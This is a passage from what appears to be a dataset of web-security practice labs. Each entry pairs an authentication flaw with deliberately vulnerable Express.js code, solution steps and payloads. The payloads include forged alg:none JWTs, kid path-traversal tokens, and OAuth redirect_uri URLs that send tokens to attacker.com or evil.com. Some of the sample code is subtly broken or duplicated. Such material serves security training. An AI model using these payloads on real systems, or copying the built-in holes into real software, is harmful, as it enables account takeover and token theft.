    "Lab Description": "This lab\u00e2\u20ac\u2122s REST-based login system includes a hidden debug parameter that allows bypassing the MFA challenge. When the debug=true parameter is set in the second-phase login POST request, the backend skips the MFA verification logic entirely. To solve: login as Carlos using the known password and bypass the MFA code requirement using the debug injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a full login request. Submit your own credentials and observe the 2FA challenge phase triggered in POST /verify.",
      "Repeat the process with the victim's username and password. In the intercepted request, add a debug=true parameter to the JSON body.",
      "Send the modified request with valid credentials and the added parameter to Burp Repeater.",
      "Observe that the MFA step is skipped and the server responds with a session cookie for Carlos.",
      "Visit /my-account using the new session cookie and verify successful login."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'carpass', mfa: '333999' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.status(200).json({ mfaRequired: true }); }); app.post('/verify', (req, res) => { const { username, code, debug } = req.body; if (debug === 'true') return res.send(`Login successful for ${username}`); const user = users.find(u => u.username === username); if (user && user.mfa === code) res.send(`Login successful for ${username}`); else res.status(403).send('Invalid MFA code'); }); app.listen(4000);",
    "payloads": [
      "{ \"username\": \"carlos\", \"password\": \"carpass\" }",
      "{ \"username\": \"carlos\", \"code\": \"000000\", \"debug\": \"true\" }",
      "POST /verify with Content-Type: application/json and debug=true"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure Set-Cookie logic in login response",
    "Lab Description": "This lab's session management implementation is vulnerable to session fixation due to insecure handling of Set-Cookie during authentication. The application reuses a user-supplied session token without regeneration after login. To solve: hijack a victim session using a pre-authenticated session ID and access Carlos's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite's Proxy to intercept a GET /login request and observe Set-Cookie behavior.",
      "In Burp Repeater, predefine a sessionID value and access the login page using the custom cookie.",
      "Log in with valid victim credentials using the same sessionID and observe that session token is not changed.",
      "Use the fixed sessionID to impersonate the victim in a different browser.",
      "Access /account/carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=post><input name=username><input name=password><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sid; sessions[sid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) res.send(`Welcome ${user}`); else res.send('Not logged in'); }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: sid=fixate123; Path=/",
      "POST /login HTTP/1.1 with sid=fixate123",
      "GET /account with Cookie: sid=fixate123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leads to signature bypass",
    "Lab Description": "The app uses JWTs for authentication and fails to verify the algorithm properly, allowing an attacker to change the token's algorithm to 'none' to bypass signature verification. The application decodes and trusts any token if it passes decoding. To solve: forge a JWT token for carlos with 'none' alg and access /dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT token issued after login and decode it using jwt.io.",
      "Replace the header's 'alg' field with 'none' and modify the payload to impersonate 'carlos'.",
      "Remove the signature portion entirely to create a two-part JWT.",
      "Use Postman to send a GET /dashboard request with the forged token in Authorization: Bearer.",
      "Verify access as carlos by confirming welcome message on dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/token', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret, { algorithm: 'HS256' }); res.send({ token }); }); app.get('/dashboard', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; if (!token) return res.status(401).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'carlos') return res.send('Welcome carlos'); } else { try { const payload = jwt.verify(token, secret); if (payload.user === 'carlos') return res.send('Welcome carlos'); } catch { return res.status(403).send('Invalid token'); } } res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"user\": \"carlos\" }",
      "JWT: base64(header).base64(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration allows token stealing via redirect",
    "Lab Description": "This lab simulates a misconfigured OAuth implicit flow that reflects access tokens in the URL fragment. An attacker can inject a malicious redirect_uri to leak the token to an external site. To solve: steal Carlos's OAuth access token and use it to access his /user/settings page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to observe the /authorize endpoint and identify the use of implicit OAuth flow (response_type=token).",
      "Craft a malicious URL with a redirect_uri pointing to your server and send it to Carlos.",
      "Run a token-stealing listener (e.g., Python HTTP server) to capture the token from redirected traffic.",
      "Extract the token from the intercepted URL fragment.",
      "Send a GET /user/settings request with Authorization: Bearer <stolen_token> and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token' && client_id === 'trusted') { const token = 'access-token-carlos'; res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.send('Invalid request'); } }); app.get('/user/settings', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') res.send('Welcome to Carlos's settings'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
    "payloads": [
      "https://vulnerable-app.com/authorize?response_type=token&client_id=trusted&redirect_uri=https://evil.com/callback",
      "Capture token from URL fragment: #access_token=access-token-carlos",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Authentication Bypass in Authorization Header",
    "Lab Description": "The application's authentication mechanism relies on JWTs passed in the Authorization header. However, the server fails to properly validate the signing algorithm. The application accepts tokens signed with 'alg':'none', bypassing signature verification. To solve: gain access to Carlos's account using a forged token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request after logging in with any valid user. Extract the JWT from the Authorization header.",
      "2. Decode the token using jwt.io or Postman to view the header and payload.",
      "3. Modify the 'alg' in the header to 'none' and set the payload 'username':'carlos'.",
      "4. Remove the signature portion of the JWT entirely.",
      "5. Send the forged token in the Authorization header via Postman or Burp Repeater and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (!payload) return res.status(401).send('Invalid token'); const user = jwt.verify(token, secret); res.send(`Account: ${user.username}`); }); app.listen(4001);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie Handling",
    "Lab Description": "The application assigns a session cookie to anonymous users but fails to rotate it after login. This allows an attacker to fix a victim's session beforehand and hijack their account once they log in. To solve: log in as Carlos using a pre-assigned session cookie.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Visit the app without logging in and capture the Set-Cookie: session=<token> header using Burp.",
      "2. Send a phishing or clickjacking payload that forces Carlos to log in while having this attacker-set cookie.",
      "3. Once Carlos logs in, reuse the same session cookie to hijack his session.",
      "4. Access the /my-account endpoint with the fixed session cookie in Burp Repeater.",
      "5. Confirm ownership of Carlos\u00e2\u20ac\u2122s session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(7); sessions[sid] = {}; res.cookie('session', sid); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[req.cookies.session].user = username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.user) res.send(`Welcome ${session.user}`); else res.status(403).send('Forbidden'); }); app.listen(4002);",
    "payloads": [
      "Cookie: session=attackerSession",
      "session fixation via iframe login using shared cookie"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI",
    "Lab Description": "The OAuth flow used by the application is improperly configured to allow open redirect URIs. This enables attackers to intercept access tokens by specifying their own domain. To solve: capture Carlos\u00e2\u20ac\u2122s OAuth access token and use it to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start OAuth login flow and observe that the redirect_uri parameter is passed via GET.",
      "2. Modify the redirect_uri to a malicious server under your control (e.g., https://attacker.com/callback).",
      "3. Use a phishing email to get Carlos to authorize access via the manipulated OAuth URL.",
      "4. Intercept the access token sent to your server after Carlos grants permission.",
      "5. Use Postman or Burp Repeater to access /my-account with the stolen token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query;  if (client_id === 'trusted-client') { const token = Buffer.from('carlos-token').toString('base64'); const redirectURL = `${redirect_uri}#access_token=${token}`; res.redirect(redirectURL); } else { res.status(400).send('Invalid client'); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; if (Buffer.from(token, 'base64').toString() === 'carlos-token') res.send('Carlos Account'); else res.status(403).send('Invalid token'); }); app.listen(4003);",
    "payloads": [
      "https://target.com/auth?client_id=trusted-client&redirect_uri=https://evil.com/callback",
      "Authorization: Bearer Y2FybG9zLXRva2Vu"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "This lab's JWT-based authentication system fails to properly validate token signatures. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite while logged in as a low-privilege user",
      "Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
      "Modify the alg header to 'none' and change the role claim to 'admin'",
      "Remove the signature portion of the JWT (after the last dot)",
      "Submit the modified token in the Authorization header to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, { algorithms: ['HS256', 'none'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
    "Lab Description": "This lab's OAuth implementation fails to properly validate redirect_uri parameters, allowing token leakage to attacker-controlled domains. The application generates OAuth tokens after successful authentication. To solve: steal a valid OAuth token by manipulating the redirect flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth authorization endpoint using OWASP ZAP's spider functionality",
      "Intercept the initial OAuth flow and modify the redirect_uri parameter to point to an attacker-controlled domain",
      "Bypass client-side validation of redirect_uri by URL-encoding special characters",
      "Capture the authorization code or token when the victim gets redirected",
      "Exchange the stolen code for an access token at the OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec456', redirectUris: ['https://legit.com/callback'] }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const client = clients[client_id];\n  \n  if (!client) return res.status(400).send('Invalid client');\n  \n  if (req.query.response_type === 'code') {\n    const authCode = 'auth_' + Math.random().toString(36).substr(2, 9);\n    const redirectUrl = new URL(redirect_uri);\n    redirectUrl.searchParams.set('code', authCode);\n    if (state) redirectUrl.searchParams.set('state', state);\n    res.redirect(redirectUrl.toString());\n  } else {\n    res.status(400).send('Unsupported response_type');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "https://attacker.com/callback?code=AUTH_CODE&state=123",
      "https://legit.com@attacker.com/callback?code=AUTH_CODE",
      "https://legit.com/callback.attacker.com?code=AUTH_CODE"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session regeneration in GraphQL endpoint",
    "Lab Description": "This lab's GraphQL API fails to properly regenerate session tokens after authentication, allowing session fixation attacks. The application maintains the same session ID pre- and post-login. To solve: fixate a session on a victim's browser and gain access when they authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Obtain a valid session cookie before authentication using Postman",
      "Craft a GraphQL mutation containing the session cookie in a CSRF attack",
      "Use OWASP ZAP to test session token behavior during login flows",
      "Verify the session remains identical after authentication by comparing cookies",
      "Inject the fixated session into a browser to hijack the authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getUser: User\n  }\n  type Mutation {\n    login(username: String!, password: String!): User\n  }\n  type User {\n    username: String\n    role: String\n  }\n`);\n\nconst root = {\n  getUser: (args, req) => {\n    if (!req.cookies.session) throw new Error('Not authenticated');\n    return { username: req.cookies.session.user, role: req.cookies.session.role };\n  },\n  login: ({ username, password }, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      if (!req.cookies.session) {\n        req.cookies.session = { id: Math.random().toString(36).substr(2, 10) };\n      }\n      req.cookies.session.user = username;\n      req.cookies.session.role = 'admin';\n      return { username, role: 'admin' };\n    }\n    throw new Error('Invalid credentials');\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000);",
    "payloads": [
      "mutation { login(username: \"admin\", password: \"admin123\") { username role } }",
      "query { getUser { username role } }",
      "POST /graphql HTTP/1.1\nHost: vulnerable.com\nCookie: session=fixated_id\nContent-Type: application/json\n\n{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"admin123\\\") { username role } }\"}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in REST API authentication",
    "Lab Description": "This lab's JWT validation improperly uses the kid header to load verification keys from the filesystem without proper sanitization. The application blindly trusts the kid parameter when selecting verification keys. To solve: craft a JWT that forces the server to use a predictable public key file for verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and decode it to analyze the kid header",
      "Modify the kid parameter to attempt directory traversal (../../../../etc/passwd)",
      "When this fails, test for predictable key locations by setting kid to known paths like ../../../../var/www/keys/public.pem",
      "Generate a new token signed with the predictable public key and elevated privileges",
      "Submit the forged token in the Authorization header to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst users = {\n  'user': { password: 'normalpass', role: 'user' },\n  'admin': { password: 'adminpass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey', { header: { kid: 'safeKey' } });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, (header, callback) => {\n      const keyPath = `/var/www/keys/${header.kid}`;\n      fs.readFile(keyPath, (err, key) => {\n        callback(err, key);\n      });\n    });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL3Zhci93d3cva2V5cy9wdWJsaWMucGVtIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via state parameter reflection",
    "Lab Description": "This lab's OAuth implementation fails to validate the state parameter between requests, allowing token hijacking. The application reflects the state parameter from the authorization request to the callback without validation. To solve: intercept an OAuth flow and steal a victim's token by predicting the state value.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate an OAuth flow using Postman and observe the state parameter format",
      "Set up a malicious redirect URI in your OAuth client configuration",
      "Intercept a victim's authorization request using Burp Suite",
      "Modify the redirect_uri to point to your server while preserving the state",
      "Capture the authorization code when the victim is redirected to your site",
      "Exchange the stolen code for an access token at the OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec456', redirectUris: ['https://legit.com/callback', 'https://attacker.com'] }\n};\n\nlet authRequests = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state, response_type } = req.query;\n  const client = clients[client_id];\n  \n  if (!client || !client.redirectUris.includes(redirect_uri)) {\n    return res.status(400).send('Invalid client or redirect URI');\n  }\n  \n  authRequests[state] = { client_id, redirect_uri };\n  res.redirect(`${redirect_uri}?code=auth_code&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code, state } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&response_type=code&state=12345",
      "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://legit.com/callback&response_type=code&state=12345",
      "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://legit.com@attacker.com&response_type=code&state=12345"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL introspection leaks",
    "Lab Description": "This lab's GraphQL endpoint exposes session management functionality through introspection, allowing attackers to fixate sessions. The application's GraphQL schema reveals mutation fields for session handling without proper access controls. To solve: use introspection to discover session mutations and fixate a session on a victim's browser.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use GraphiQL or Postman to send an introspection query to the GraphQL endpoint",
      "Analyze the schema to discover session-related mutations",
      "Craft a mutation to generate or modify session tokens",
      "Fixate the generated session token in a victim's browser via XSS or social engineering",
      "Wait for the victim to authenticate and hijack their session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getUser: User\n    getSession: Session\n  }\n  type Mutation {\n    login(username: String!, password: String!): User\n    createSession(username: String!): Session\n    rotateSession: Session\n  }\n  type User {\n    username: String\n    role: String\n  }\n  type Session {\n    id: String\n    expires: String\n  }\n`);\n\nconst root = {\n  getUser: (args, req) => {\n    if (!req.cookies.session) throw new Error('Not authenticated');\n    return { username: req.cookies.session.user, role: req.cookies.session.role };\n  },\n  getSession: (args, req) => {\n    return { id: req.cookies.session?.id, expires: '2023-12-31' };\n  },\n  login: ({ username, password }, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      if (!req.cookies.session) {\n        req.cookies.session = { id: Math.random().toString(36).substr(2, 10) };\n      }\n      req.cookies.session.user = username;\n      req.cookies.session.role = 'admin';\n      return { username, role: 'admin' };\n    }\n    throw new Error('Invalid credentials');\n  },\n  createSession: ({ username }, req) => {\n    const sessionId = Math.random().toString(36).substr(2, 10);\n    return { id: sessionId, expires: '2023-12-31' };\n  },\n  rotateSession: (args, req) => {\n    if (!req.cookies.session) throw new Error('No session');\n    req.cookies.session.id = Math.random().toString(36).substr(2, 10);\n    return { id: req.cookies.session.id, expires: '2023-12-31' };\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000);",
    "payloads": [
      "mutation { createSession(username: \"admin\") { id } }",
      "query { __schema { mutationType { fields { name description } } }",
      "mutation { rotateSession { id } }"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping in microservice authentication",
    "Lab Description": "This lab's microservice architecture fails to properly validate JWT signatures across services. The frontend service accepts unsigned tokens when forwarded from internal services. To solve: bypass authentication by stripping the signature from a valid JWT and injecting it into internal service calls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite while making normal API requests",
      "Remove the signature portion and test if the unsigned token is accepted",
      "Identify internal service endpoints through API documentation or fuzzing",
      "Craft a request to an internal user management service with the unsigned token",
      "Escalate privileges by modifying user attributes in the internal service response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst internalServices = {\n  'user-service': 'http://internal-user-service'\n};\n\napp.use((req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.decode(token, { complete: true });\n      if (req.headers['x-internal-request'] === 'true') {\n        req.user = decoded.payload;\n        return next();\n      }\n      jwt.verify(token, 'secretKey');\n      req.user = decoded.payload;\n    } catch (err) {\n      return res.status(401).send('Invalid token');\n    }\n  }\n  next();\n});\n\napp.get('/internal/user', async (req, res) => {\n  const response = await fetch(`${internalServices['user-service']}/user`, {\n    headers: {\n      'Authorization': `Bearer ${req.headers.authorization?.split(' ')[1]}`,\n      'X-Internal-Request': 'true'\n    }\n  });\n  res.json(await response.json());\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure PKCE implementation",
    "Lab Description": "This lab's OAuth implementation uses Proof Key for Code Exchange (PKCE) incorrectly, allowing authorization code interception. The application fails to validate the code_verifier properly during token exchange. To solve: intercept an authorization code and exchange it for a token without the original code_verifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate an OAuth flow using Postman with PKCE parameters",
      "Intercept the authorization code response using Burp Suite",
      "Observe the PKCE code_challenge method and parameters",
      "Attempt token exchange without the code_verifier parameter",
      "Modify the code_challenge_method to 'plain' when the original uses 'S256'",
      "Complete the token exchange to obtain an access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { \n    secret: 'sec456', \n    redirectUris: ['https://client.com/callback'],\n    requirePKCE: true\n  }\n};\n\nlet authCodes = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, code_challenge, code_challenge_method } = req.query;\n  const client = clients[client_id];\n  \n  if (!client) return res.status(400).send('Invalid client');\n  \n  const authCode = 'code_' + Math.random().toString(36).substr(2, 8);\n  authCodes[authCode] = { \n    client_id,\n    code_challenge,\n    code_challenge_method\n  };\n  \n  res.redirect(`${redirect_uri}?code=${authCode}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code, code_verifier } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  if (client.requirePKCE && !authCodes[code]) {\n    return res.status(400).json({ error: 'invalid_grant' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code",
      "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code&code_challenge_method=plain",
      "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code&code_verifier="
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "This lab's WebSocket implementation creates sessions during the HTTP handshake without proper validation. The application assigns session identifiers before authentication is complete. To solve: fixate a session during the WebSocket handshake and hijack it after victim authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish a WebSocket connection using Burp Suite's WebSockets history",
      "Analyze the handshake request for session identifiers",
      "Modify the handshake request to inject a known session ID",
      "Trigger authentication through the WebSocket channel",
      "Reuse the fixated session ID in a new connection to hijack the authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\nconst sessions = {};\n\nwss.on('connection', (ws, req) => {\n  let sessionId = req.cookies.session || 'sess_' + Math.random().toString(36).substr(2, 10);\n  sessions[sessionId] = { authenticated: false };\n  \n  ws.on('message', (message) => {\n    try {\n      const data = JSON.parse(message);\n      if (data.type === 'login') {\n        if (data.username === 'admin' && data.password === 'admin123') {\n          sessions[sessionId].authenticated = true;\n          sessions[sessionId].user = 'admin';\n          ws.send(JSON.stringify({ type: 'auth', status: 'success' }));\n        } else {\n          ws.send(JSON.stringify({ type: 'auth', status: 'failure' }));\n        }\n      } else if (data.type === 'admin_command') {\n        if (sessions[sessionId].authenticated) {\n          ws.send(JSON.stringify({ type: 'result', data: 'Admin action performed' }));\n        }\n      }\n    } catch (err) {\n      console.error(err);\n    }\n  });\n});",
    "payloads": [
      "{\"type\":\"login\",\"username\":\"admin\",\"password\":\"admin123\"}",
      "{\"type\":\"admin_command\",\"action\":\"get_flag\"}",
      "Cookie: session=fixated_session_id"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's JWT-based authentication fails to properly validate token signatures. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT token using Burp Suite while logging in as low-privilege user",
      "Decode the token using jwt.io to analyze structure and claims",
